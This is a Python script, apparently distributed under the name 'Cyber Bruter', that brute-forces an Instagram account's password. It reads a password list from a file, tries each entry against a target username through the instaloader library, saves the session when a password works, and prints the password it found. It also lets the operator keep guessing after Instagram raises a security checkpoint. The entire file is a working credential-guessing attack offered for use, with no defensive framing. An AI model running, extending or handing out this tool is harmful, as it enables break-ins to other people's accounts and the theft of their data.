import instaloader
from instaloader.exceptions import BadCredentialsException, ConnectionException, TwoFactorAuthRequiredException
import os

os.system('clear')

GREEN = '\033[92m'
RED = '\033[91m'
BLUE = '\033[94m'
LIGHT_CYAN = '\033[96m'
RESET = '\033[0m'
LIGHT_AQUA = '\033[96m'
LIGHT_PURPLE = '\033[95m'
LIGHT_TEAL = '\033[94m'
VERY_LIGHT_BLUE = '\033[38;2;173;216;230m'

def check_credentials(username, password):
    L = instaloader.Instaloader()
    try:
        L.login(username, password)  # Kullanıcı adı ve şifreyle giriş yap
        L.save_session_to_file()  # Oturumu dosyaya kaydet (isteğe bağlı)
        return True, None
    except BadCredentialsException:
        return False, None
    except TwoFactorAuthRequiredException:
        return False, "two_factor_auth"
    except ConnectionException as e:
        if "Checkpoint required" in str(e):
            return None, "checkpoint"
        else:
            return False, str(e)

print(f"""{LIGHT_CYAN}

  ▄████▄▓██   ██▓ ▄▄▄▄   ▓█████  ██▀███
▒██▀ ▀█ ▒██  ██▒▓█████▄ ▓█   ▀ ▓██ ▒ ██▒
▒▓█    ▄ ▒██ ██░▒██▒ ▄██▒███   ▓██ ░▄█ ▒
▒▓▓▄ ▄██▒░ ▐██▓░▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄
▒ ▓███▀ ░░ ██▒▓░░▓█  ▀█▓░▒████▒░██▓ ▒██▒
░ ░▒ ▒  ░ ██▒▒▒ ░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░
  ░  ▒  ▓██ ░▒░ ▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░
░       ▒ ▒ ░░   ░    ░    ░     ░░   ░
░ ░     ░ ░      ░         ░  ░   ░
░       ░ ░           ░
    ▄▄▄▄    ██▀███   █    ██ ▄▄▄█████▓▓█████  ██▀███
   ▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
   ▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
   ▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄
   ░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ░▒████▒░██▓ ▒██▒
   ░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
   ▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░     ░     ░ ░  ░  ░▒ ░ ▒░
    ░    ░   ░░   ░  ░░░ ░ ░   ░         ░     ░░   ░
    ░         ░        ░                 ░  ░   ░
         ░
     {RESET}""")
print(f"  {LIGHT_AQUA}(✓) Made available by cyber arches.{RESET}")
print("")

print(f"  {GREEN}Information:  Username is not checked in this program.{RESET}")
print("")

# Şifreleri dosyadan okuyup liste haline getir
def read_passwords_from_file(filename):
    with open(filename, 'r') as file:
        passwords = file.readlines()
    # Her satırın sonundaki boşlukları ve yeni satır karakterlerini temizle
    passwords = [password.strip() for password in passwords]
    return passwords

# Kullanıcı adını dosyadan oku
username = input(f"  {VERY_LIGHT_BLUE}Instagram Username: {RESET}")
print("")

# Kullanıcıdan şifre dosyasının adını al
filename = input(f"  {VERY_LIGHT_BLUE}Password Folder: {RESET}")
print("")

found_correct_password = False
passwords = read_passwords_from_file(filename)
checkpoint_warning_given = False

for password in passwords:
    result, error = check_credentials(username, password)
    if result:
        print(f"  {GREEN}Instagram account password is correct:{RESET} {password}")
        print("")
        found_correct_password = True
        break
    elif error == "checkpoint" and not checkpoint_warning_given:
        print(f"  {RED}Checkpoint required. Please verify your account on Instagram.{RESET}")
        choice = input(f"  {RED}Do you want to continue despite the checkpoint warning? (y/n): {RESET}")
        if choice.lower() == 'y':
            print("")
            checkpoint_warning_given = True  # İlk uyarı verildi
            continue
        else:
            print(f"  {VERY_LIGHT_BLUE}Information: Stopping program per user request.{RESET}")
            break
    elif error == "checkpoint" and checkpoint_warning_given:
        # İlk uyarı zaten verildi, bu nedenle bir şey yapmayacağız
        continue
    elif error == "two_factor_auth":
        print(f"  {VERY_LIGHT_BLUE}Two-factor authentication is enabled: {password}{RESET}")
        print("")
        break
    else:
        print(f"  {RED}Instagram account password is wrong:{RESET} '{password}'")
        print("")

if not found_correct_password:
    print(f"  {LIGHT_PURPLE}Information:{RESET} {LIGHT_AQUA}All passwords are wrong.{RESET}")
    print("")
